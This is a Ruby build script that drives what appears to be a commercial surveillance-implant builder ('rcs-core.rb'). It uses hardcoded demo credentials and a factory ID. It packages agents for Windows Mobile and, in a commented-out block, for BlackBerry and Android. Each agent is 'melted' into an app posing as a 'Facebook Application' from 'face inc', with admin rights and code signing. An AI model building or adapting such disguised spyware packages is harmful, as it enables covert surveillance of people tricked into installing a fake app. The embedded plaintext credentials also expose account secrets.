#!/usr/bin/env ruby

require 'json'

USER = 'alor'
PASS = 'demorcss'
FACTORY = 'RCS_0000000001'
PLATFORM = 'winmo'

###################################################################################################
begin
  params = {platform: 'winmo',
            binary: {demo: true},
            melt: {appname: 'facebook'},
            package: {type: 'remote'}
            }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
end
###################################################################################################
=begin
params = {platform: 'wap',
          generate: {platforms: ['blackberry', 'android'],
                     binary: {demo: true, admin: true},
                     melt: {admin: true,
                            appname: 'facebook',
                            name: 'Facebook Application',
                            desc: 'Applicazione utilissima di social network',
                            vendor: 'face inc',
                            version: '1.2.3'},
                     sign: {edition: '5th3rd'}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o wap.zip"
=end
###################################################################################################